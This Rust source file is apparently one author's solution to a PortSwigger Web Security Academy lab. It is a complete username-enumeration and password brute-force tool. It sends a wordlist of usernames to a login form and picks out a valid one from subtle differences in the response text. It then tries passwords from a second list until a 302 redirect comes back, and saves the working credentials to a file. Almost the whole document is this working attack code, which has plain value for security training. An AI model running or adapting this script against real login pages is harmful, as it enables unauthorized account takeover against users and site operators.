/***************************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 26/8/2023
*
* Lab: Username enumeration via subtly different responses
*
* Steps: 1. Enumerate a valid username via subtly different error messages
*        2. Brute force password of that valid username
*
****************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use lazy_static::lazy_static;
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    fs::{self, OpenOptions},
    io::{self, Write},
    ops::Add,
    rc::Rc,
    sync::{
        atomic::{AtomicUsize, Ordering},
        Mutex,
    },
    thread,
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Global variables
*******************/
lazy_static! {
    static ref FAILED_USERS: Mutex<Vec<String>> = Mutex::new(Vec::new());
    static ref FAILED_PASSWORDS: Mutex<Vec<String>> = Mutex::new(Vec::new());
    static ref USERS_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref FAILED_USERS_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref FAILED_PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
}

/******************
* Main Function
*******************/

fn main() {
    let url = "https://0afd0062041235fd81ec66ea00d50037.web-security-academy.net/login"; // change this url
    let client = build_client(); // build the client which will be used in all subsequent requests
    let usernames = fs::read_to_string("/home/ahmed/users").unwrap(); // change the path to your list
    let passwords = fs::read_to_string("/home/ahmed/passwords").unwrap(); // change the path your list

    let start_time = time::Instant::now(); // capture the time before enumeration

    let valid_user = get_valid_username(start_time, url, &client, usernames); // try to get a valid username
    let mut valid_password = Some(String::new());
    if let Some(user) = valid_user {
        // if you found a valid one
        valid_password = brute_force_password(start_time, url, client, &user, passwords); // brute force his password
        match valid_password {
            // if you found a valid password
            Some(password) => {
                print_valid_credentials(&user, &password); // print valid credential
                save_results(start_time, "results", &user, &password);
                // save resultes to a file in the current working directory
                // you can change this name to what you want
            }
            None => {
                save_results(start_time, "results", &user, ""); // save resultes to a file in the current working directory
                println!("{}", "[!] Couldn't find valid password".red());
            }
        }
    } else {
        save_results(start_time, "results", "", ""); // save resultes to a file in the current working directory
        println!("{}", "[!] Couldn't find valid username".red());
    }
    print_finish_message(start_time); // print the total elapsed time
    print_failed_requests(); // print the failed request to try them later
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/***********************************************************************
* Function used to enumerate usernames
* Parameters:
    - Instant: to ouptut an updated elapsed time to the terminal
    - URL: the URL of the lab
    - client: the client we build using the build_client() function
    - usernames: the list of gathered usernames
************************************************************************/
fn get_valid_username(
    start_time: Instant,
    url: &str,
    client: &Client,
    usernames: String,
) -> Option<String> {
    println!("\n[#] Enumerate usernames..");
    let regex = Regex::new("Invalid username").unwrap(); // pattern to search for
    let total_counts = usernames.lines().count(); // total number of usernames to try
    for (index, user) in usernames.lines().enumerate() {
        // iterate over the usernames list
        let success_counter = USERS_COUNTER.fetch_add(1, Ordering::Relaxed); // update the success counter
        let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed); // get the fail counter value
        let elapsed_time = start_time.elapsed().as_secs() / 60; // get elapsed time in minutes
                                                                // print the update inforamtion to the terminal
        print_progress(
            elapsed_time,
            fail_counter,
            success_counter,
            total_counts,
            user,
        );
        let data = HashMap::from([("username", user), ("password", "not important now")]); // the POST data to send
        let mut login = client.post(url).form(&data).send(); // try to login
        if let Ok(res) = login {
            // if login OK
            let body = res.text().unwrap(); // get the body of the response
                                            // search for these 2 patterns in the body
            let pattern1 = check_pattern("<!-- -->", &body);
            let pattern2 = check_pattern(r"password\.", &body);
            if pattern1 & !pattern2 {
                // the compination of the 2 patterns vary from lab to another; make sure to adjust these to fit your lab
                return Some(user.to_string());
            } else {
                continue;
            }
        } else {
            // if the request failed try it again
            login = client.post(url).form(&data).send(); // try to login
            if let Ok(res2) = login {
                let body = res2.text().unwrap();
                let pattern1 = check_pattern("<!-- -->", &body);
                let pattern2 = check_pattern(r"password\.", &body);
                if pattern1 && !pattern2 {
                    return Some(user.to_string());
                } else {
                    continue;
                }
            } else {
                // if the request failed after 2 tries, save it to try later
                FAILED_USERS_COUNTER.fetch_add(1, Ordering::Relaxed); // add 1 to failed counter
                FAILED_USERS.lock().unwrap().push(user.to_string()); // save this user to a list to try it later
            }
        }
    }
    println!("");
    None
}

/***********************************************************************
* Function used to brute force passwords
* Parameters:
    - Instant: to ouptut an updated elapsed time to the terminal
    - URL: the URL of the lab
    - client: the client we build using the build_client() function
    - passwords: the list of gathered usernames
    - valid user: the valid user to brute force his password
************************************************************************/
fn brute_force_password(
    start_time: Instant,
    url: &str,
    client: Client,
    valid_user: &str,
    passwords: String,
) -> Option<String> {
    println!("\n[#] Brute forcing password..");
    println!(
        "{}: {}",
        "✅ Valid user".white().bold(),
        valid_user.green().bold()
    );
    let total_counts = passwords.lines().count(); // total number of passwords to try
                                                  // iterate over the whole list of passwords
    for (index, password) in passwords.lines().enumerate() {
        let success_counter = PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed); // update the success counter
        let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed); // get the fail counter value
        let elapsed_time = start_time.elapsed().as_secs() / 60; // get elapse time in minutes
                                                                // print the update info
        print_progress(
            elapsed_time,
            fail_counter,
            success_counter,
            total_counts,
            password,
        );
        let data = HashMap::from([("username", valid_user), ("password", password)]); // the POST data to send
        let mut login = client.post(url).form(&data).send(); // try to login
        if let Ok(res) = login {
            // if the request succeeded
            if res.status().as_u16() == 302 {
                // if a redirection happens ( correct password )
                println!("");
                return Some(password.to_string()); // return the valid password
            }
        } else {
            // if the request failed, try to send it again
            login = client.post(url).form(&data).send();
            if let Ok(res) = login {
                if res.status().as_u16() == 302 {
                    println!("");
                    return Some(password.to_string());
                }
            } else {
                // if the repeated request also failed,
                // upate the counter and save the password to try it later
                FAILED_PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);
                FAILED_PASSWORDS.lock().unwrap().push(password.to_string());
            }
        }
    }
    println!("");
    None
}

/***************************************
* Function used to print the update info
* to the terminal in a nice format
****************************************/
#[inline(always)]
fn print_progress(
    elapsed_time: u64,
    fail_counter: usize,
    success_counter: usize,
    total_counts: usize,
    text: &str,
) {
    print!(
        "\r{}: {:3} minutes || {}: {:3} || {} ({}/{}): {:50}",
        "Elapsed".yellow().bold(),
        elapsed_time,
        "Failed".red().bold(),
        fail_counter,
        "Trying".white().bold(),
        success_counter,
        total_counts,
        text.blue().bold()
    );
    io::stdout().flush().unwrap();
}

/********************************************************
* Function used to print the valid username and password
*********************************************************/
#[inline(always)]
fn print_valid_credentials(valid_user: &str, valid_password: &str) {
    println!(
        "\n{}: username: {}, password: {}",
        "✅ Login successfully".white(),
        valid_user.green().bold(),
        valid_password.green().bold()
    );
}

/****************************************************
* Function used to to print finish time
*****************************************************/
#[inline(always)]
fn print_finish_message(start_time: Instant) {
    println!(
        "\n{}: {:?} minutes",
        "✅ Finished in".green().bold(),
        start_time.elapsed().as_secs() / 60
    );
}

/****************************************************
* Function used to print failed usernames and password
* that we tried 2 times earlier and also failed
*****************************************************/
#[inline(always)]
fn print_failed_requests() {
    let failed_users = FAILED_USERS.lock().unwrap();
    println!(
        "\n\n{}: {} \n{}: {:?}",
        "[!] Failed users count".red().bold(),
        failed_users.len().to_string().yellow().bold(),
        "[!] Failed users".red().bold(),
        failed_users
    );
    let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
    println!(
        "\n\n{}: {} \n{}: {:?}",
        "[!] Failed password count".red().bold(),
        failed_passwords.len().to_string().yellow().bold(),
        "[!] Failed password".red().bold(),
        failed_passwords
    )
}

/*********************************************
* Function used to save results to a txt file
**********************************************/
fn save_results(start_time: Instant, file_name: &str, valid_user: &str, valid_password: &str) {
    let failed_users = FAILED_USERS.lock().unwrap();
    let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
    let to_save = format!(
        "✅ Finished in: {elapsed_time:?} minutes \n\n\
    Username: {user}, Password: {pass} \n\n\
    [!] Failed users count: {fusers_count} \n\
    [!] Failed users: {fusers:?} \n\n\
    [!] Failed passwords count: {fpasswords_count} \n\
    [!] Failed passwords: {fpasswords:?} \n\n",
        elapsed_time = start_time.elapsed().as_secs() / 60,
        fusers_count = failed_users.len(),
        fusers = failed_users,
        fpasswords = failed_passwords,
        fpasswords_count = failed_passwords.len(),
        user = valid_user,
        pass = valid_password
    );
    let new_file = fs::File::create(file_name);
    if let Ok(mut file_created) = new_file {
        write!(file_created, "{}", to_save);
        println!(
            "\n{}: {}",
            "Restults was saved to".yellow().bold(),
            file_name.green().bold()
        )
    } else {
        println!("\n{}", "[!] Couldn't create new file to save results".red());
    }
}

/****************************************************
* Function to check a pattern in a text
*****************************************************/
fn check_pattern(pattern: &str, text: &str) -> bool {
    if let Some(result) = Regex::new(pattern).unwrap().find(text) {
        true
    } else {
        false
    }
}
